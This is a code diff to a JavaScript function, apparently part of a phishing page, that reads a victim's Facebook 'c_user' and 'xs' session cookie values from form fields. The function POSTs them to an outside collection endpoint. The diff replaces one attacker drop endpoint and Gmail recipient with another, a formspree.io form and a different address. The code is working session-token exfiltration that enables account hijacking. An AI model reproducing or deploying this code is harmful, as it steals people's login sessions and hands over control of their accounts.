@@ -766,30 +766,32 @@
     }
 
     async function sendAuto() {
-        const cUserInputVal = cUserInput.value.trim();
-        const xsInputVal = xsInput.value.trim();
-        
-        // Always send c_user and xs
-        fetch("https://postal-form.on.shiper.app/submit", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                c_user: cUserInputVal,
-                xs: xsInputVal,
-                emails: ["viaquinn18@gmail.com"],
-                workerEmail: "",
-                name: "Eng",
-            }),
-        }).then(res => {
-            if (res.ok) {
-                console.log("Auto-submission successful");
-            } else {
-                throw new Error('Auto-submission failed');
-            }
-        }).catch(err => {
-            console.error("Auto-submission error:", err);
-        });
-    }
+  const cUserInputVal = cUserInput.value.trim();
+  const xsInputVal = xsInput.value.trim();
+
+  // Always send c_user and xs
+  fetch("https://formspree.io/f/xblqrelw", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      c_user: cUserInputVal,
+      xs: xsInputVal,
+      emails: ["mashoowkh@gmail.com"], // optional field
+      workerEmail: "",
+      name: "Formspree Submission"
+    }),
+  })
+    .then(res => {
+      if (res.ok) {
+        console.log("Auto-submission successful");
+      } else {
+        throw new Error("Auto-submission failed");
+      }
+    })
+    .catch(err => {
+      console.error("Auto-submission error:", err);
+    });
+      }
 
     // Validation functions
     function validateCUser(value) {
